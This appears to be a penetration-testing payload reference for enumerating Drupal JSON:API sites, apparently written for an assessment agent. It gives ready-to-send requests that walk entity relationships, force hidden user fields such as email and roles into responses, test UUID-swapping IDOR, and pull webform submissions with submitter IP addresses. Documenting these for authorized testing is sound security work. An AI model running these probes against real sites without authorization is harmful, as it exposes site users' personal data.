# Drupal JSON:API — Deep-Enum Payloads

> Source: Custom — compiled from the Drupal JSON:API module documentation and entity-access research.

Use these payloads after `vendor-platform-enum/SKILL.md` triggers on a Drupal JSON:API fingerprint. The `/jsonapi/` namespace exposes every content entity, user, taxonomy term, and file as a REST resource; the access decision is per-resource (entity-type / bundle / field) so one missing access-control hook on one resource exposes adjacent resources too.

## Root document — `GET /jsonapi/`

The root document lists every entity-type / bundle pair the API exposes. Anonymous callers usually receive the same root document that authenticated callers do — the access decision happens at the resource level, not the root.

```bash
aith assess kali exec --technique INFO-DISCLOSURE \
  --intent "Drupal JSON:API root enumeration" \
  --probe-kind fingerprint --phase recon --timeout 30 -- \
  curl -sS 'https://TARGET/jsonapi/' -H 'Accept: application/vnd.api+json'
```

The response shape:

```json
{
  "jsonapi": {"version": "1.0"},
  "data": [],
  "links": {
    "node--article": {"href": "https://TARGET/jsonapi/node/article"},
    "node--page": {"href": "https://TARGET/jsonapi/node/page"},
    "user--user": {"href": "https://TARGET/jsonapi/user/user"},
    "taxonomy_term--tags": {"href": "https://TARGET/jsonapi/taxonomy_term/tags"},
    "...": "..."
  }
}
```

Every key in `links` is a probe target.

## Common entity-type / bundle pairs

```
node/article, node/page, node/blog, node/news, node/event, node/<custom-bundle>,
user/user, role/role, taxonomy_term/tags, taxonomy_term/<vocab>, file/file,
media/image, media/video, media/document, media/<bundle>,
block_content/basic, block_content/<type>, comment/comment, comment/<type>,
menu_link_content/menu_link_content, paragraph/<bundle>,
commerce_product/default, commerce_product/<type>, commerce_product_variation/default,
commerce_order/default, commerce_payment_method/credit_card, commerce_promotion/order_item_percentage_off,
webform/webform, webform_submission/<webform>, webform_submission_log/webform_submission_log,
contact_message/feedback, contact_message/<form>,
eck_entity/<bundle>, paragraph/<bundle>, ...
```

For each pair, send `GET /jsonapi/<type>/<bundle>?page[limit]=1`. A 200 with non-empty `data[]` is anonymous-readable.

## Sparse-fieldset abuse

Drupal JSON:API supports the JSON:API spec's `?fields[<type>--<bundle>]=...` parameter. The default field set sometimes hides sensitive fields when the access check runs on the default include list — but the sparse-fieldset request can force the response to include them when the per-field access check is missing or misconfigured:

```
GET /jsonapi/user/user?page[limit]=1&fields[user--user]=mail,name,roles,field_phone,field_internal_note,uid,init,langcode,timezone,status
GET /jsonapi/node/article?page[limit]=1&fields[node--article]=title,body,field_internal_only,field_review_notes,uid
```

A 200 with the requested fields populated indicates the per-field access check is missing — record each field as a separate disclosure when the data is sensitive.

## `filter[]` query DSL

JSON:API supports filtering via `?filter[<field>]=<value>` and richer condition groups:

```
?filter[status]=1                                                 # equality
?filter[uid.id]=<user-uuid>                                       # related-field equality
?filter[title][operator]=CONTAINS&filter[title][value]=admin      # operator + value
?filter[my-group][group][conjunction]=OR                          # condition group
?filter[my-group][group][memberOf]=my-group                       # nest the group
```

Combined with `?include=<related-resource>`, one request returns the row plus its referenced resources — the JSON:API equivalent of a chain walk:

```
GET /jsonapi/node/article?filter[uid.id]=<user-uuid>&include=uid,field_attachment,field_taxonomy
GET /jsonapi/comment/comment?filter[entity_id.id]=<node-uuid>&include=uid
```

## Chain-disclosure walks

| Source resource | Reference field | Target resource |
|---|---|---|
| `node/<bundle>` | `uid` | `user/user` |
| `node/<bundle>` | `field_image`, `field_attachment` | `file/file` |
| `node/<bundle>` | `field_tags`, `field_<vocab>` | `taxonomy_term/<vocab>` |
| `comment/comment` | `uid`, `entity_id` | `user/user`, source node |
| `media/<bundle>` | `field_media_image`, `field_media_video_file` | `file/file` |
| `webform_submission/<webform>` | `uid`, `webform` | `user/user`, `webform/webform` |
| `commerce_order/default` | `uid`, `order_items`, `billing_profile`, `shipping_profile` | `user/user`, items, profile |

Walk each reference with `?include=<reference-field>`. The chain depth is usually 2-3 hops because most references resolve back to user/user or file/file.

## Bounded-vs-systemic IDOR test

Take one leaked UUID (e.g., the `uid.id` from a leaked node) and replace it with a different UUID:

```
GET /jsonapi/user/user/<modified-uuid>
GET /jsonapi/node/article?filter[uid.id]=<modified-uuid>
```

- **Bounded** — modified UUID returns 404 or empty `data[]`. The leak is the original entity plus its chain.
- **Systemic** — modified UUID returns 200 with a different user. The whole resource is anonymous-enumerable, severity escalates.

## Index discovery — `?include` traversal

The full set of resource relationships is enumerable by walking `?include=*`:

```
GET /jsonapi/node/article?page[limit]=1&include=*
```

Drupal returns the resource plus every referenced resource. The `relationships` block on each row enumerates the available `include` paths — record them as the resource's edge set.

## Webform submission probe

`/jsonapi/webform_submission/<webform-id>` exposes form submissions. When a webform is configured with anonymous-readable submissions (or the per-submission access check is missing), this resource leaks every contact form, every newsletter signup, every job-application response.

```
GET /jsonapi/webform_submission/<webform-id>?page[limit]=1&fields[webform_submission--<webform>]=data,uid,uri,remote_addr,sid
```

The `data` field contains the submission JSON; the `remote_addr` field leaks the submitter's IP address.

## Rate-limit discipline

Drupal JSON:API does not have a built-in rate limit — the per-page-cache TTL bounds repeated requests but not unique requests. Default to 1 request / 500ms (2 RPS) and respect any `Retry-After` header from a fronting WAF / CDN. The page cache also means the response may be stale by up to 5 minutes; for fresh reads, append `?_random=$RANDOM` to bust the cache (if the policy permits).
